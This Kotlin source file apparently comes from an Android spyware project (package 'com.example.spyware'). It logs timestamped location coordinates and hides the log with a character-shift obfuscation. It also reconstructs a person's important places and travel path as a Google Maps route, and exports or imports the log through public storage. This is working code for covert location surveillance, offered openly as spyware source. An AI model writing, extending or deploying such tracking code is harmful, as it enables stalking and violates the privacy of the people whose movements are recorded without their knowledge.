import android.content.Context
import android.os.Environment
import com.example.spyware.common.Constants.Companion.DISTINGUISHING_DISTANCE_KM
import com.example.spyware.common.Constants.Companion.END_TIMESTAMP
import com.example.spyware.common.Constants.Companion.ERROR
import com.example.spyware.common.Constants.Companion.LATITUDE
import com.example.spyware.common.Constants.Companion.LOG_TIME_TO_LIVE_DAYS
import com.example.spyware.common.Constants.Companion.LONGITUDE
import com.example.spyware.common.Constants.Companion.START_TIMESTAMP
import com.example.spyware.common.Constants.Companion.TIMESTAMP
import com.example.spyware.common.Constants.Companion.logShift
import com.example.spyware.common.Constants.Companion.outputFileName
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.io.FileInputStream
import java.time.Instant
import java.time.ZoneId
import java.time.format.DateTimeFormatter
import java.time.temporal.ChronoUnit
import java.util.UUID
import kotlin.math.atan2
import kotlin.math.cos

// Shift each character n places backward (encode)
private fun shiftStringBack(str: String, n: Int): String {
    val sb = StringBuilder(str.length)
    for (char in str) {
        sb.append((char.code - n).toChar())
    }
    return sb.toString()
}

// Shift each character n places forward (decode)
private fun shiftStringForward(str: String, n: Int): String {
    val sb = StringBuilder(str.length)
    for (char in str) {
        sb.append((char.code + n).toChar())
    }
    return sb.toString()
}

// Write encoded data to file
fun writeShiftedToFile(location: File, fileName: String, data: String, n: Int) {
    try {
        if (!location.exists()) location.mkdirs()

        val shifted = shiftStringBack(data, n)
        val file = File(location, fileName)
        FileOutputStream(file).use { it.write(shifted.toByteArray()) }
    } catch (e: Exception) {
        e.printStackTrace()
        writeShiftedToFile(location,UUID.randomUUID().toString()+fileName,data,n)
    }
}

// Read and decode data from file
fun readShiftedFromFile(location: File, fileName: String, n: Int): String? {
    return try {
        val file = File(location, fileName)
        FileInputStream(file).use {
            val shifted = it.readBytes().toString(Charsets.UTF_8)
            shiftStringForward(shifted, n)
        }
    } catch (e: Exception) {
        e.printStackTrace()
        null
    }
}

fun filterLogsOnDate(logs:String, startInstant:Instant?, endInstant:Instant?): String {
    if(startInstant==null||endInstant==null)
        return logs
    val filteredLogs = logs.lines().filter { line ->
        try {
            val jsonObject = JSONObject(line)
            val timestampStr = jsonObject.getString(TIMESTAMP)
            if (timestampStr.isNotEmpty()) {
                val timestamp = Instant.parse(timestampStr)
                timestamp.isAfter(startInstant) && timestamp.isBefore(endInstant)
            } else {
                true // Keep lines without timestamp (or handle as needed)
            }
        } catch (e: Exception) { true /* Keep malformed lines or handle error */ }
    }?.joinToString("\n") ?: ""
    return filteredLogs
}

fun filterLogsOnDate(logs:List<JSONObject>, startInstant:Instant?, endInstant:Instant?): List<JSONObject> {
    if(startInstant==null||endInstant==null)
        return logs
    return logs.filter { log ->
        try {

            val timestampStr = log.getString(TIMESTAMP)
            if (timestampStr.isNotEmpty()) {
                val timestamp = Instant.parse(timestampStr)
                timestamp.isAfter(startInstant) && timestamp.isBefore(endInstant)
            } else {
                true // Keep lines without timestamp (or handle as needed)
            }
        } catch (e: Exception) { true /* Keep malformed lines or handle error */ }
    }
}

fun appendShiftedToFile(location: File, fileName: String,data:String, n: Int) {
    val content:String?=readShiftedFromFile(location,fileName,n)
    val oneYearAgo = Instant.now().minus(LOG_TIME_TO_LIVE_DAYS, ChronoUnit.DAYS)
    val filteredContent = filterLogsOnDate(content ?: "",oneYearAgo,Instant.now())
    val newContent = (if (filteredContent.isNotEmpty()) filteredContent + "\n" else "") + data
    writeShiftedToFile(location,fileName,newContent,n)
}

fun log(context:Context, jsonObject: JSONObject){
    val currentUtcTime = DateTimeFormatter.ISO_INSTANT.format(Instant.now())
    jsonObject.put(TIMESTAMP, currentUtcTime)
    val logs=getLogs(context)
    var filteredLogs=filterLogsOnDate(logs,Instant.now().minus(LOG_TIME_TO_LIVE_DAYS, ChronoUnit.DAYS),Instant.now())
    filteredLogs=filteredLogs+jsonObject
    writeShiftedToFile(context.filesDir,outputFileName,filteredLogs.map{it.toString()}.joinToString("\n") ?: "", logShift)
}

fun getLogs(context:Context):List<JSONObject>{
    val content:String?=readShiftedFromFile(context.filesDir,outputFileName,logShift)
    return content?.lines()?.filter { it.isNotBlank() }?.map { JSONObject(it) } ?: listOf()
}

fun getErrorStringsFromLogs(context:Context): String {
    val logs=getLogs(context)
    return logs.filter { log-> log.has(ERROR) }.joinToString("\n") { it.toString() }
}

/**
 * Get important locations from logs.
 */
fun getReducedLogs(context:Context,startInstant:Instant?,endInstant:Instant?): String {
    val logs=getLogs(context)
    val filteredLogs= filterLogsOnDate(logs,startInstant,endInstant)
    val locationJSONObjects= filteredLogs.filter { it.has(LATITUDE) }
    val importantLocations=getImportantLocations(locationJSONObjects)
    return importantLocations.map{ formatHeatmap(it)}.joinToString("\n")
}

fun getTraversedPath(context:Context,startInstant:Instant?,endInstant:Instant?): String {
    val logs=getLogs(context)
    val filteredLogs= filterLogsOnDate(logs,startInstant,endInstant)
    val locationLogs= filteredLogs.filter { it.has(LATITUDE) }
    val importantLocations=getImportantLocations(locationLogs)
    return getGoogleMapsPath(importantLocations)
}

fun calculateDistance(loc1:JSONObject,loc2:JSONObject):Double{
    return calculateDistance(loc1.getDouble(LATITUDE),loc1.getDouble(LONGITUDE),loc2.getDouble(
        LATITUDE),loc2.getDouble(LONGITUDE))
}

// Function to calculate distance between two coordinates using Haversine formula
fun calculateDistance(lat1: Double, lon1: Double, lat2: Double, lon2: Double): Double {
    val r = 6371 // Radius of Earth in kilometers

    val latDistance = Math.toRadians(lat2 - lat1)
    val lonDistance = Math.toRadians(lon2 - lon1)

    val a = kotlin.math.sin(latDistance / 2) * kotlin.math.sin(latDistance / 2) +
            cos(Math.toRadians(lat1)) * cos(Math.toRadians(lat2)) *
            kotlin.math.sin(lonDistance / 2) * kotlin.math.sin(lonDistance / 2)

    val c = 2 * atan2(kotlin.math.sqrt(a), kotlin.math.sqrt(1 - a))
//    println(""+lat1+","+lon1+";"+lat2+","+lon2+":"+(r*c))
    return r * c // Distance in kilometers
}

fun downloadHeatMap(context:Context){
    val content:String?=readShiftedFromFile(context.filesDir,outputFileName,logShift)
    writeShiftedToFile(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),outputFileName,(content?:""),0)
}

fun exportHeatMap(context:Context){
    val content:String?=readShiftedFromFile(context.filesDir,outputFileName,logShift)
    writeShiftedToFile(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),outputFileName,(content?:""), logShift)
}

fun importHeatMap(context:Context){
    val content:String?=readShiftedFromFile(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),outputFileName,logShift)
    writeShiftedToFile(context.filesDir,outputFileName,(content?:""), logShift)
}

